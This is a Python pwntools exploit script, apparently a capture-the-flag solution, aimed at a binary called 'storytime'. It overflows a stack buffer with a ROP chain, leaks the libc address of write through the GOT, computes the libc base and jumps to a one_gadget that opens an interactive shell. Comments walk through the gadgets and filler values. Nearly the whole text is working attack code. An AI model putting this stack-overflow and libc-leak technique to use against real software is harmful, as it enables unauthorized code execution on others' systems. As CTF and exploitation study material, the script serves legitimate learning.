from pwn import *

s = process("./storytime", env={"LD_PRELOAD": "./libc.so.6"})
libc = ELF("./libc.so.6")

write = 0x601018    # .got.plt
climax = 0x40060e

pop_rsi_r15_ret = 0x0000000000400701
mov_edi_0x1 = 0x00000000004005e4    # in the middle of the function middle. It will set edi to 1 then call write which makes our payload looks like write(1,write@got.plt)

payload = "A"*0x38
payload += p64(pop_rsi_r15_ret)
payload += p64(write)               # this goes to rsi
payload += p64(0xdeadbeefdeadbeef)  # filler for pop r15
payload += p64(mov_edi_0x1)

""" Now after executing write in the function middle it will pop rbp then ret:
    Dump of assembler code for function middle:
   0x00000000004005d4 <+0>:	push   rbp
   0x00000000004005d5 <+1>:	mov    rbp,rsp
   0x00000000004005d8 <+4>:	mov    edx,0x28
   0x00000000004005dd <+9>:	lea    rsi,[rip+0x15c]        # 0x400740
   0x00000000004005e4 <+16>:	mov    edi,0x1
   0x00000000004005e9 <+21>:	call   0x4004a0 <write@plt>
   0x00000000004005ee <+26>:	nop
[*]0x00000000004005ef <+27>:	pop    rbp
   0x00000000004005f0 <+28>:	ret

=> we need filler for ebp
"""
payload += p64(0xcafebabecafebabe) # filler for rbp
payload += p64(climax)      # jump to climax for another bof

s.sendline(payload)

s.recvuntil("Tell me a story: \n")
leak = s.recv(8)
libc_base = u64(leak) - libc.symbols["write"]
log.info("Libc base address: {}".format(hex(libc_base)))

one_shot = libc_base + 0x4526a      # one_gadget libc.so.6
payload = "A"*0x38                  # offset in the function climax
payload += p64(one_shot)
s.sendline(payload)

s.interactive()


